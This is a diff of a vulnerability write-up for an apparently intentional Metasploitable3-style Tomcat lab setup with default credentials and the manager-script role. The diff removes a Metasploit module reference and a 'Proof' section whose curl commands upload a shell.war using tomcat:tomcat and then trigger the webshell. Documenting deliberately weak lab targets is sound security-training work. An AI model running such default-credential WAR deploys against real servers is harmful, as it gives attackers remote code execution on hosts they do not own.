@@ -5,7 +5,7 @@
 
 ## CVE
 N/A (configuration weakness; enables arbitrary WAR deploy → RCE via the `manager-script`
-role — see the Metasploit module `exploit/multi/http/tomcat_mgr_upload`.)
+role.)
 
 ## Description
 The Tomcat 8.0.33 instance on this host ships with:
@@ -18,7 +18,7 @@ The Tomcat 8.0.33 instance on this host ships with:
 
 The `manager-script` role allows authenticated clients to **deploy arbitrary WAR files**
 via `PUT /manager/text/deploy`. With known default credentials an attacker gains
-remote code execution as the Tomcat service account with a single `curl` command.
+remote code execution as the Tomcat service account.
 
 This reproduces the shipped configuration of upstream Metasploitable3
 (`scripts/chocolatey_installs/tomcat.bat` + the bundled `tomcat-users.xml`).
@@ -42,13 +42,4 @@ This reproduces the shipped configuration of upstream Metasploitable3
 <Context antiResourceLocking="false" privileged="true">
   <!-- (no <Valve className="...RemoteAddrValve" .../>) -->
 </Context>
-```
-
-## Proof
-```
-curl -u tomcat:tomcat --upload-file shell.war \
-    "http://<target>:8080/manager/text/deploy?path=/shell"
-# -> OK - Deployed application at context path [/shell]
-curl "http://<target>:8080/shell/"
-# -> webshell executes
 ```
